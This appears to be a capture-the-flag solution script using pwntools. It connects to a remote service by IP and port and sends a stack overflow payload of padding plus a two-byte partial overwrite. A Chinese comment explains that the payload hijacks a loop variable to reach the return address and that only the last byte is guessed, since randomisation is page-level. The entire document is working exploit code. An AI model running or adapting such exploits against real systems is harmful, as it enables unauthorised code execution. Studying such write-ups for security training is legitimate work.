#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
r.sendline(b"a" * 0x2C + b"\x37" + b"\x42")
# 劫持循环变量i，跳转到返回地址，此题中返回地址随机化程度为页（即0x1000）级别，所以只需要猜测最后一位即可
r.interactive()
